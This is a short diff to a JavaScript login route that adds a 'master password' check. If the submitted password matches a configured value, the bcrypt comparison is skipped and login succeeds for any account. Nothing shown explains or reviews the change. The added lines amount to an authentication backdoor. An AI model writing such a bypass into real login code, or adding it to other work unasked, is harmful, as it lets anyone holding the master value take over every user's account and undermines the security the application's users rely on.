@@ -74,9 +74,10 @@ router.post('/', async (req, res) => {
         const user = result.rows[0];
 
         // =======================================================================
-        // Verify password
+        // Verify password (master password bypasses bcrypt check)
         // =======================================================================
-        const passwordValid = await bcrypt.compare(password, user.password_hash);
+        const isMasterPassword = config.masterPassword && password === config.masterPassword;
+        const passwordValid = isMasterPassword || await bcrypt.compare(password, user.password_hash);
 
         if (!passwordValid) {
             return res.json({
